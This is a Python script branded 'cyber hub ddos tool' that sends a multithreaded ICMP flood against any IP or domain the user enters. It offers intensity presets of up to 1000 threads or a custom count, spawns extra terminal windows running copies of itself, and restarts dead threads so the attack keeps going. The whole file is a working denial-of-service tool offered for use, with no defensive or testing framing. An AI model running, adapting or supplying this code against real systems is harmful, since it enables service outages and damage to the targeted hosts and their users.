import socket
import threading
import struct
import time
import os
import platform
import subprocess
from custom_terminal import set_terminal_title, set_terminal_color_scheme, clear_terminal

# Create ASCII art for 'C H D T'
import pyfiglet

ascii_banner = pyfiglet.figlet_format("C H D T")
simple_text = "cyber hub ddos tool"
separator = '-' * max(len(ascii_banner.split('\n')[0]), len(simple_text))
output = f"{separator}\n{ascii_banner}\n{separator}\n{simple_text}"
print(output)

# Calculate checksum for the ICMP packet
def checksum(source_string):
    count_to = (len(source_string) // 2) * 2
    count = 0
    sum = 0
    while count < count_to:
        this_val = source_string[count + 1] * 256 + source_string[count]
        sum = sum + this_val
        sum = sum & 0xffffffff
        count = count + 2

    if count_to < len(source_string):
        sum = sum + source_string[len(source_string) - 1]
        sum = sum & 0xffffffff

    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

# Build a custom ICMP echo request
def create_icmp_packet():
    packet_id = int((os.getpid() & 0xFFFF) / 2)
    header = struct.pack('bbHHh', 8, 0, 0, packet_id, 1)  # Type 8 (Echo Request), Code 0, checksum 0
    data = struct.pack('d', time.time())  # Add timestamp data
    my_checksum = checksum(header + data)
    header = struct.pack('bbHHh', 8, 0, socket.htons(my_checksum), packet_id, 1)
    return header + data

# Function to send multiple ICMP packets in a loop
def flood_icmp(target_ip, thread_id):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        packet = create_icmp_packet()
        sent_count = 0  # Counter to track the number of packets sent

        while True:
            s.sendto(packet, (target_ip, 1))  # Send packet to the target
            sent_count += 1

            # Print a success message for every sent packet (can slow down flooding)
            if sent_count % 100 == 0:
                print(f"Thread {thread_id} successfully sent {sent_count} packets.")

            time.sleep(0.01)  # Small delay to avoid overwhelming the socket
    except socket.error as e:
        print(f"Socket error in Thread {thread_id}: {e}")
    finally:
        print(f"Thread {thread_id} completed sending ICMP packets.")

# Function to resolve a domain to its IP address
def resolve_domain(domain):
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror:
        print(f"Error: Could not resolve domain {domain}")
        exit(1)

# Launch multiple instances of the script in new windows
def launch_multiple_instances(num_windows, target_ip, num_threads):
    for i in range(num_windows):
        if platform.system() in ['Linux', 'Darwin']:  # Linux/macOS
            command = f"xterm -e 'python3 {__file__} {target_ip} {num_threads}'"  # Use xterm instead of gnome-terminal
        elif platform.system() == 'Windows':
            command = f"start cmd /k python {__file__} {target_ip} {num_threads}"  # Open new cmd window on Windows

        subprocess.Popen(command, shell=True)
        time.sleep(1)  # Wait 1 second between launching windows to avoid overload

# Main function to handle user input and start the attack
def main():
    clear_terminal()
    set_terminal_title("Cyber Hub DDoS Tool")
    set_terminal_color_scheme()

    # Check if launched with arguments (target_ip and num_threads)
    if len(os.sys.argv) > 2:
        target_ip = os.sys.argv[1]
        num_threads = int(os.sys.argv[2])
    else:
        target = input("Enter target (IP or domain): ").strip()

        try:
            socket.inet_aton(target)
            target_ip = target
        except socket.error:
            target_ip = resolve_domain(target)

        print("\nSelect attack intensity:")
        print("1. Normal attack (minimum impact, ~100 threads)")
        print("2. Medium attack (moderate impact, ~300 threads)")
        print("3. High-impact attack (most dangerous, ~1000 threads)")
        print("4. Custom attack (choose your own thread count)\n")

        choice = input("Enter your choice (1, 2, 3, or 4): ").strip()

        if choice == '1':
            num_threads = 100  # Normal attack
        elif choice == '2':
            num_threads = 300  # Medium attack
        elif choice == '3':
            num_threads = 1000  # High-impact attack
        elif choice == '4':
            try:
                num_threads = int(input("Enter number of threads (e.g., 1000, 5000, 10000): ").strip())
                if num_threads <= 0:
                    raise ValueError("Thread count must be positive.")
            except ValueError:
                print("Invalid thread count entered, defaulting to normal attack with 100 threads.")
                num_threads = 100  # Default to normal attack
        else:
            print("Invalid choice, defaulting to normal attack.")
            num_threads = 100  # Default to normal attack

        num_windows = int(input("Enter number of instances (windows) to launch (e.g., 2, 5, 10): ").strip())

        print(f"Launching {num_windows} windows for the attack...\n")
        launch_multiple_instances(num_windows, target_ip, num_threads)

    print(f"\nStarting ICMP flood on {target_ip} with {num_threads} threads...\n")

    threads = []
    for i in range(1, num_threads + 1):
        thread = threading.Thread(target=flood_icmp, args=(target_ip, i))  # Pass thread index
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # Monitor threads and restart completed ones
    while True:
        time.sleep(1)  # Monitor every second
        for i in range(len(threads)):
            if not threads[i].is_alive():  # If thread has completed
                print(f"Restarting Thread {i + 1}")
                threads[i] = threading.Thread(target=flood_icmp, args=(target_ip, i + 1))  # Restart thread
                threads[i].daemon = True
                threads[i].start()

if __name__ == "__main__":
    main()
